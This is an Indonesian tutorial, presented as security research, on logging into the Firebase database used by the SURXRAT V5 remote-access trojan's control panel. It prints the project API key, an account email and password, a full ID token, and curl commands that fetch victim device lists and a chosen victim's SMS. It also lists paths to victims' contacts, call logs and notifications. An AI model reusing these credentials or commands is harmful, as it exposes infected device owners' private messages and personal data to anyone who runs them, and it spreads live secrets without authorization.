# Tutorial Akses Database Firebase SURXRAT V5

Panduan ini menjelaskan cara mengakses database Firebase yang digunakan oleh C2 Panel SURXRAT untuk keperluan riset keamanan dan analisis forensik.

> **Peringatan:** Gunakan informasi ini hanya untuk tujuan edukasi dan riset keamanan. Mengakses data tanpa izin dapat melanggar hukum.

---

## 1. Kredensial Firebase
Berdasarkan analisis file `index-0CLwk5Y_.js`, berikut adalah kredensial yang digunakan:

*   **Project ID:** `fir-e9e7b`
*   **Database URL:** `https://fir-e9e7b-default-rtdb.firebaseio.com`
*   **API Key:** `AIzaSyDfHMsNoknifGnkJEr6DJPSoEiwmbmlYBc`
*   **Auth Domain:** `fir-e9e7b.firebaseapp.com`

---

## 2. Research Account Credentials (Aktif)
Akun berikut telah didaftarkan untuk keperluan analisis saat ini:

*   **Email:** `gemini_test_research@gmail.com`
*   **Password:** `ResearchPassword123!`
*   **ID Token (Valid ~1 Jam):** 
    `eyJhbGciOiJSUzI1NiIsImtpZCI6ImEyZGZiOGEzOGI1MmQ5ZjA5ZWRjYWE1MDcwYTBlOGYwYTllMDk4YmEiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vZmlyLWU5ZTdiIiwiYXVkIjoiZmlyLWU5ZTdiIiwiYXV0aF90aW1lIjoxNzczMDUyNDA3LCJ1c2VyX2lkIjoiNEUzelZHcnNpQlYwSXd6RWJMb1ZRQTFvejFxMiIsInN1YiI6IjRFM3pWR3JzaUJWMEl3ekViTG9WUUExb3oxcTIiLCJpYXQiOjE3NzMwNTI0MDcsImV4cCI6MTc3MzA1NjAwNywiZW1haWwiOiJnZW1pbmlfdGVzdF9yZXNlYXJjaEBnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnsiZW1haWwiOlsiZ2VtaW5pX3Rlc3RfcmVzZWFyY2hAZ21haWwuY29tIl19LCJzaWduX2luX3Byb3ZpZGVyIjoicGFzc3dvcmQifX0.l7vB4UdpWA_4Egx1A2t2VrwxSWEw9ceIJTHVVOH__NtRCenm-H0NI5QbUkw2ph1RWIFkIwrP2Anv0TY_QUOdIFegyHUZL1S8ZUIdWsj8QfbJbxQE0djLc44bEsIEEioXkrUHdHcm-9JRGSHv-LcDHAaCwZCXUy4RPe1rGsff1JGtkvkltDQQuCxFhm5gxfqIlK_9N8d2XoZuajvKtxz_hW9PMoNw7YuOf_8gVnVvy569NzomTK8WYDQmizMsFCfYvCWQncdMmVMgOsVlbJdqzT4Mp1_H_Gb7PiWQ4fX2oNgSBeLxZILw6hZkkEd5uyqYz3YJemzmtuw9l0tkGSaYdA`

---

## 3. Cara Mendapatkan ID Token Baru
Database ini dilindungi oleh Firebase Security Rules, sehingga Anda memerlukan `ID Token` yang valid. Token ini didapat dengan melakukan Login (Sign In).

### Menggunakan cURL:
```bash
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyDfHMsNoknifGnkJEr6DJPSoEiwmbmlYBc" \
-H "Content-Type: application/json" \
-d '{
    "email": "gemini_test_research@gmail.com",
    "password": "ResearchPassword123!",
    "returnSecureToken": true
}'
```

---

## 4. Cara Query Data (Realtime Database)
Setelah mendapatkan `idToken`, Anda dapat mengakses endpoint database menggunakan parameter `auth`.

### A. Melihat Daftar Victim (Metadata)
```bash
curl -s "https://fir-e9e7b-default-rtdb.firebaseio.com/surxrat5.json?auth=ID_TOKEN_ANDA"
```

### B. Melihat SMS Victim Spesifik
Ganti `DEVICE_ID` dengan ID yang ditemukan di daftar victim.
```bash
curl -s "https://fir-e9e7b-default-rtdb.firebaseio.com/database/sms/DEVICE_ID.json?auth=ID_TOKEN_ANDA"
```

---

## 5. Struktur Database Penting
*   `surxrat5/`: Berisi metadata perangkat (Model, IP, Lokasi, Status Online).
*   `database/sms/`: Berisi seluruh log SMS masuk dan keluar.
*   `database/contacts/`: Daftar kontak telepon korban.
*   `database/calls/`: Riwayat panggilan telepon.
*   `notif/`: Log notifikasi real-time (WhatsApp, Telegram, dll).
*   `control/`: Antrian perintah (Command) yang dikirimkan attacker ke perangkat.
